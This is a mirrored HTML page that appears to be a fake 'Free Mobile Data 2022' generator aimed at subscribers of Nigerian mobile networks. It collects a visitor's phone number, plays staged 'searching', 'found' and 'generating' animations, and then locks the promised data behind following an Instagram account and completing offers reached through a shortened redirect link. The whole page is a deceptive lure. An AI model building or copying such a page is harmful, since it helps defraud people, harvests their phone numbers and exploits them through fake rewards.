<!DOCTYPE html>

<!-- Mirrored from rankinternet.herokuapp.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 20 Feb 2022 13:44:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
   <link rel="stylesheet" href="style.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Free Mobile Data 2022</title>

</head>
<body>
    <canvas id=c></canvas>
   <center id="content">
   <img src="FREE.png" class="logo">
   <div class="main" id="main">
      <div class="step1" id="step1" style="Display:1none">
         <div class="step1-text"><b>Enter your Phone Number and select your Network.</b></div>
         <br>
         <div class="inputbox">
            <img src="free-mobile-phone-icon-760-thumb.png" class="username-icon">
            <input class="u-i"  placeholder="Phone Number"  id="uid" >
         </div>
         <div class="grid-container" style="margin-top: 10px;">
            <div class="selectedPlatform" style="" id="platform1" onclick="Selectedplatform(&#39;platform1&#39;)"> <img src="mtn.jpg" style="width:40px;height:40px;margin-top: -5px;">   </div>
            <div class="platform" id="platform2" onclick="Selectedplatform(&#39;platform2&#39;)">   <img src="glo-mobile-largex5-logo.png"  style="width:40px;height:40px;margin-top: -5px;">   </div>
            <div class="platform" id="platform3" onclick="Selectedplatform(&#39;platform3&#39;)">   <img src="9Mobile-Telecom-Logo.png"  style="width:45px;height:32px;margin-top: 0px;">   </div>
            <div class="platform" id="platform4" onclick="Selectedplatform(&#39;platform4&#39;)">    <img src="2089ec2a-airtel-africa-logo.gif"  style="width:40px;height:40px;margin-top: -5px;">   </div>
         </div>
         <div class="bnt" id="proStep1" onclick="proStep1()">CONTINUE</div>
      </div>
      <div class="step2" id="step2" style="Display:none">
         <div class="seaching-text">
            Searching Phone Number....
         </div>
         <br>
         <div class="searching-box" id="search-name">
            Name
         </div>
         <div class="searching-platform">
            <img src="mtn.jpg" id="img-platform" style="width:40px;height:40px;margin-top: 7px;">
         </div>
      </div>
      <div class="step3" id="step3" style="Display:none">
         <div class="userfound-text">
            Phone Number FOUND!
         </div>
         <br>
         <img src="16425989072fc8ed97461b77bf12569459468d12a8.png" class="imgcheckok">
      </div>
   </div>
   <div class="main" id="main2" style="Display:none">
      <div class="step1">
         <div class="step1-text"><b>Select the amount of Mobile Data </b></div>
         <br>
         <div class="gems-Amount-Selected" id="gemsAmountSelected1" onclick="gemsAmountSelected(&#39;gemsAmountSelected1&#39;,&#39;5 &#39;)"><img src="2648398-200.png" style="width:30px;margin-bottom: -7px;"> <span style="font-size: 20px;font-weight: bold;">2</span><span style="font-size: 20px;"> GB</span> </div>
         <div class="gems-Amount" id="gemsAmountSelected2" onclick="gemsAmountSelected(&#39;gemsAmountSelected2&#39;,&#39;10 &#39;)"><img src="2648398-200.png" style="width:30px;margin-bottom: -7px;"> <span style="font-size: 20px;font-weight: bold;">4</span><span style="font-size: 20px;"> GB</span> </div>
         <div class="gems-Amount" id="gemsAmountSelected3" onclick="gemsAmountSelected(&#39;gemsAmountSelected3&#39;,&#39;20 &#39;)"><img src="2648398-200.png" style="width:30px;margin-bottom: -7px;"> <span style="font-size: 20px;font-weight: bold;">5</span><span style="font-size: 20px;"> GB</span> </div>
         <div class="gems-Amount" id="gemsAmountSelected4" onclick="gemsAmountSelected(&#39;gemsAmountSelected4&#39;,&#39;25 &#39;)"><img src="2648398-200.png" style="width:30px;margin-bottom: -7px;"> <span style="font-size: 20px;font-weight: bold;">10</span><span style="font-size: 20px;">GB</span> </div>
      </div>
      <div class="bnt2" onclick="proStep2()">GENERATE</div>
   </div>
   </div>
   <div class="main3" id="main3" style="display:none">
      <img src="16426790659414628850f860edff29f151c9d4f880.png" class="setting-icon" style="width:150px;filter: invert(40%);">
      <div class="step1-text" id="loading-step">Loading...</div>
      <div class="pro-bg">
         <div class="pro-bar" id="pro-bar">
         </div>
      </div>
      <img src="163542468278c021e06cc778d4aef36f80e47413a2.gif" style="width:25px;display:none;margin-top:20px" id="sloading" class="sloading">
   </div>
   <div id="gems-gen" class="gemsgenanimation" style="display:none">
      <div class="main4" id="main4" style="display:1none">
         <img src="163542468278c021e06cc778d4aef36f80e47413a2.gif" id="settingicon" class="setting-icon" style="width:20px;position:absolute; right:3px;top:3px">
         <img src="2648398-200.png" id="gemsicon" style="  width:50px;
            margin-top:10px;margin-bottom: 5px;">
         <div class="gemsgen" id="gemsgen">0
         </div>
         <span id="genname" class="gemsgenname">name</span>
      </div>
   </div>
   <div class="main5" id="main5" style="display:none">
      <div class="step">
         <div class="step-icon">    <img src="#"  id="sloading" class="sloading">
         </div>
      </div>
      <div class="lastStep-text" >LAST STEP</div>
      <div style="margin-top:10px;" class="text-lastStep">
         Hello <span id="lastStep-name" style="    font-size: 22px;
            color: #2cc66c;
            font-weight: 900;"></span>! You are almost done. <span id="lastStep-gems" style="  font-size: 20px;
            color: #2cc66c;
            font-weight: 900;"></span> Will be added to your phone number ! Please complete the last step by click on the button below.
      </div>
      <div class="lastStep-card">
         <img src="2648398-200.png" id="gemsicon" style="  width:50px;
            margin-top:10px;margin-bottom: 5px;">
         <div class="gemsgen" id="lastStep-gems2">0
         </div>
         <span id="lastStep-name2" class="gemsgenname">name</span>
      </div>
      <div class="col-3">
         <div class="snippet" data-title=".dot-falling">
            <div class="stage">
               <div class="dot-falling"></div>
            </div>
         </div>
      </div>
      <div class="waiting">WAITING</div>
      <button onclick="showDiv()" class="bnt3"  style="text-decoration:none;position: relative;
    top: 20px;">VERIFY NOW </button>
   </div>
</center>
  <div id="welcomeDiv" class="centerscreen" style="display:none;">
  
            <div class="body show" style="font-family:Fredoka One">
               <div class="logocontainer">
                  <div class="logoborderbg">
                     <div class="logobgAnimation">
                        <div class="logobgAnimation2"></div>
                     </div>
                     <div class="logoborder">
                        <img style="margin-top: 45px;" src="ios12-control-center-cellular-data-icon.png" class="logoAnimation logo">
                     </div>
                  </div>
               </div>
               <div class="header">--- FINAL STEP ---</div>
               <!--div class="line">
                  <div class="line-Ani"></div>
                  </div>
                  <div class="line2">
                  <div class="line-Ani"></div>
                  </div-->
               <div  class="content2">Follow Any Instagram To Continue & Your Mobile Data Package will unlock automatically!</div>
               <div id='step2-wrapper' style='display: contents;'>
                  <a  target='_blank' rel='noreferrer' href='../external.html?link=https://t.co/hniR6YvptL' title='Enter your mobile number'>
                  
                  </a>
                  
               </div>
               <div class="content2">please complete the offers to send your mobile data</div>
               <div style="color:#70d4ec;">Waiting for completion</div>
               <div class="lds-ripple">







                  <div></div>
                  <div></div>
               </div>
            </div>	
         </div>
		 	<script type='text/javascript' src="main.js"></script>
</body>
